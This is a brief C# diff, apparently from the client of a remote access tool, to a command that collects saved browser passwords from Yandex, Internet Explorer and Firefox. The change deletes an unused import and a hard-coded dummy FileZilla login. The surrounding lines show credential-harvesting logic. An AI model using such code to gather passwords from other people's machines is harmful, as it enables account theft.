@@ -9,7 +9,6 @@ using xClient.Core.Networking;
 using xClient.Core.Utilities;
 using xClient.Enums;
 using System.Collections.Generic;
-using xClient.Core.Recovery;
 using xClient.Core.Recovery.Browsers;
 
 namespace xClient.Core.Commands
@@ -26,8 +25,6 @@ namespace xClient.Core.Commands
             mainList.AddRange(Yandex.GetSavedPasswords());
             mainList.AddRange(InternetExplorer.GetSavedPasswords());
             mainList.AddRange(Firefox.GetSavedPasswords());
-
-            mainList.Add(new LoginInfo() { Application = "FileZilla", Password = "pw", URL = "https://www.google.de", Username = "max"});
 
             List<string> raw = new List<string>();
 
